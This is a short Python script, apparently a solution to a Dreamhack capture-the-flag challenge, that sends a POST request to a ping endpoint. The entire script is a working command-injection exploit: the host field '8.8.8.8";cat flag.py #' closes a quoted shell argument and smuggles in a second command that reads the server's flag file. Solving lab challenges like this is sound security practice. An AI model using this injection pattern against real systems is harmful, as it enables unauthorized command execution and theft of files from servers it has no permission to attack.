import requests

url = "http://host3.dreamhack.games:18915/ping"
payload = '8.8.8.8";cat flag.py #'

res = requests.post(url, data={"host": payload}, timeout=5)
print(res.text)
